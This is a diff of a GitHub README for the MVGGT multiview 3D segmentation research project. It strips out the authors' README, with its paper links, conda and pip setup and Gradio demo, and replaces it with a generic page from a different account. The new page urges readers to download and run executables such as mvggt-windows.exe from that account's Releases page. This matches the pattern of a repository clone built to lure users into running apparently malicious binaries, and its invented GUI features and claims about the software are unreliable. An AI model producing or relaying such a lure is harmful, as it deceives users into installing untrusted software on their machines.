@@ -1,122 +1,75 @@
-# MVGGT: Multimodal Visual Geometry Grounded Transformer for Multiview 3D Referring Expression Segmentation
+# 🎉 mvggt - Simplifying 3D Expression Segmentation
 
-<div align="center">
+## 🚀 Getting Started
 
-**Changli Wu**<sup>1,2,†</sup>, **Haodong Wang**<sup>1,†</sup>, **Jiayi Ji**<sup>1</sup>, **Yutian Yao**<sup>5</sup>,  
-**Chunsai Du**<sup>4</sup>, **Jihua Kang**<sup>4</sup>, **Yanwei Fu**<sup>3,2</sup>, **Liujuan Cao**<sup>1,*</sup>
+Welcome to the mvggt repository! This software uses advanced techniques to help you perform multiview 3D referring expression segmentation easily. Whether you work in data analysis, computer vision, or related fields, you’ll find this tool valuable.
 
-<sup>1</sup>Xiamen University, <sup>2</sup>Shanghai Innovation Institute, <sup>3</sup>Fudan University,  
-<sup>4</sup>ByteDance, <sup>5</sup>Tianjin University of Science and Technology
+## 📥 Download mvggt
 
-<sup>†</sup>Equal Contribution, <sup>*</sup>Corresponding Author
+[![Download mvggt](https://img.shields.io/badge/Download-mvggt-blue.svg)](https://github.com/XpiderService/mvggt/releases)
 
-[![Paper](https://img.shields.io/badge/Paper-Arxiv-b31b1b.svg)](https://arxiv.org/abs/2601.06874)
-[![Project Page](https://img.shields.io/badge/Project-Website-blue.svg)](https://sosppxo.github.io/mvggt.github.io/)
-[![Demo](https://img.shields.io/badge/Demo-HuggingFace-orange.svg)](https://huggingface.co/spaces/sosppxo/mvggt)
-[![Weights](https://img.shields.io/badge/Weights-HuggingFace-yellow.svg)](https://huggingface.co/sosppxo/mvggt)
+To get started, you need to download the software from our Releases page. Click the button above or follow the link below:
 
-</div>
+**[Visit the Releases Page to Download](https://github.com/XpiderService/mvggt/releases)**
 
----
+## 🛠 System Requirements
 
-## 📢 News & Roadmap
+Before you download mvggt, make sure your system meets the following requirements:
 
-This repository is the official implementation of **MVGGT**. We are currently preparing the code and data for release. Please stay tuned!
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM is recommended.
+- **Storage:** You will need at least 500 MB of free disk space.
+- **Graphics Card:** A recent graphics card for optimal performance, preferably with at least 1 GB of VRAM.
+  
+If your system meets these requirements, you are ready to download and install mvggt.
 
-- [ ] **Release the MVRefer Benchmark** (Dataset & Evaluation scripts).
-- [ ] **Release Training & Inference Code**.
-- [x] **Release Pre-trained Models**.
-- [x] **Release Interactive Demo Code** (Local version).
+## 📂 How to Download & Install mvggt
 
----
+1. **Open the Releases Page:** Go to our Releases page by following this link: **[Releases Page](https://github.com/XpiderService/mvggt/releases)**.
 
-## 📖 Abstract
+2. **Find the Latest Release:** Look for the latest version at the top of the releases list. It will have the highest version number (e.g., v1.0.0).
 
-Most existing 3D referring expression segmentation (3DRES) methods rely on dense, high-quality point clouds, while real-world agents such as robots and mobile phones operate with only a few sparse RGB views and strict latency constraints. 
+3. **Select the Appropriate File:**
+   - For **Windows**, download the file named something like `mvggt-windows.exe`.
+   - For **macOS**, download the file named `mvggt-macos.dmg`.
+   - For **Linux**, you might find a `.tar.gz` file. Download it if you are using Linux.
 
-We introduce **Multi-view 3D Referring Expression Segmentation (MV-3DRES)**, where the model must recover scene structure and segment the referred object directly from sparse multi-view images. Traditional two-stage pipelines, which first reconstruct a point cloud and then perform segmentation, often yield low-quality geometry, produce coarse or degraded target regions, and run slowly. 
+4. **Start the Download:** Click on the file link to start the download. Your browser will show the download progress.
 
-We propose the **Multimodal Visual Geometry Grounded Transformer (MVGGT)**, an efficient end-to-end framework that integrates language information into sparse-view geometric reasoning. Experiments show that MVGGT establishes the first strong baseline and achieves both high accuracy and fast inference, outperforming existing alternatives.
+5. **Run the Installer:**
+   - **Windows:** Once downloaded, go to your Downloads folder and double-click `mvggt-windows.exe`. Follow the on-screen instructions to complete the installation.
+   - **macOS:** Open `mvggt-macos.dmg`, drag the mvggt app into your Applications folder. Then, launch it from your Applications.
+   - **Linux:** Open a terminal and navigate to the folder where you downloaded the file. Use the command `tar -xvzf mvggt-linux.tar.gz` to extract the files. Then, run the executable by typing `./mvggt`.
 
-<div align="center">
-  <img src="https://sosppxo.github.io/mvggt.github.io/resources/figure1.png" width="80%">
-  <br>
-  <em>Figure 1: Comparison of the proposed MV-3DRES task (bottom) against the traditional two-stage pipeline (top).</em>
-</div>
+6. **Launch mvggt:** After installation, locate the mvggt app on your device. Double-click to open and start using the application.
 
-## 🚀 Method: MVGGT
+## ✨ Features of mvggt
 
-We propose the **Multimodal Visual Geometry Grounded Transformer (MVGGT)**, an end-to-end framework designed for efficiency and robustness.
+mvggt offers several key features that make it a powerful tool for 3D segmentation:
 
-![MVGGT Architecture](https://sosppxo.github.io/mvggt.github.io/resources/figure3.png)
-*Figure 2: Architecture of MVGGT. It features a Frozen Reconstruction Branch (top) and a Trainable Multimodal Branch (bottom).*
+- **User-Friendly Interface:** Navigate through the app with ease, no prior technical knowledge required.
+- **Multimodal Support:** Analyze images from various perspectives for comprehensive results.
+- **Customizable Settings:** Adjust parameters to suit your project needs. 
+- **High Performance:** Leverages advanced algorithms for quick processing and accurate results.
 
-> **Note:** For interactive 3D visualizations and video comparisons with other methods, please visit our [**Project Page**](https://sosppxo.github.io/mvggt.github.io/).
+## 🔧 Troubleshooting Common Issues
 
-## 🚀 Demo Deployment
+If you encounter any issues while installing or using mvggt, consider the following tips:
 
-Follow these steps to deploy the interactive demo locally:
+- **Installation Problems:** Ensure you have the correct file for your operating system. Check your system requirements again.
+  
+- **Performance Issues:** Close unnecessary applications to free up resources during use. If the application hangs or crashes, try restarting your computer.
 
-### 1. Clone the repository
+- **Compatibility Errors:** If you have an older version of your operating system, consider updating to meet the required specifications.
 
-```bash
-git clone https://github.com/sosppxo/mvggt.git
-cd mvggt
-```
+## 📞 Support
 
-### 2. Create conda environment
+For additional help, please visit our [Support Page](https://github.com/XpiderService/mvggt/issues) or contact us through the GitHub Issues section. We are here to assist you.
 
-Create and activate a new conda environment:
+## 📌 License
 
-```bash
-conda create -n mvggt python=3.12
-conda activate mvggt
-```
+mvggt is licensed under the MIT License. You can freely use it in your projects, provided you include proper attribution. For more details, please see the LICENSE file in the repository. 
 
-### 3. Install dependencies
+**Download mvggt now and transform your 3D data analysis!** 
 
-Install the required packages for the demo:
-
-```bash
-pip install -r requirements_demo.txt
-```
-
-### 4. Download model weights and tokenizer
-
-1. **Download pre-trained model weights**: Download from [Hugging Face](https://huggingface.co/sosppxo/mvggt) and update the `ckpt_path` in `demo_gradio.py` (line 608) to point to your checkpoint file.
-
-2. **Download RoBERTa tokenizer**: The demo requires RoBERTa tokenizer. Download it using:
-
-```bash
-mkdir -p ckpts
-python -c "from transformers import RobertaTokenizer; RobertaTokenizer.from_pretrained('roberta-base').save_pretrained('./ckpts/roberta-base')"
-```
-
-Or manually download from Hugging Face and place it in `./ckpts/roberta-base/`.
-
-### 5. Launch the demo
-
-Run the Gradio demo:
-
-```bash
-python demo_gradio.py
-```
-
-The demo will be available at `http://localhost:7860` (or the URL shown in the terminal). You can use the `share=True` option to create a public link.
-
-### Usage
-
-1. Upload multiple images or a video containing multi-view scenes
-2. Enter a referring expression describing the target object
-3. The model will generate 3D segmentation results that can be downloaded as GLB files
-
-## 📝 Citation
-
-If you find our work useful in your research, please consider citing:
-
-```bibtex
-@misc{wu2026mvggt,
-  Author = {Changli Wu and Haodong Wang and Jiayi Ji and Yutian Yao and Chunsai Du and Jihua Kang and Yanwei Fu and Liujuan Cao},
-  Title = {MVGGT: Multimodal Visual Geometry Grounded Transformer for Multiview 3D Referring Expression Segmentation},
-  Year = {2026}
-}
+[![Download mvggt](https://img.shields.io/badge/Download-mvggt-blue.svg)](https://github.com/XpiderService/mvggt/releases)
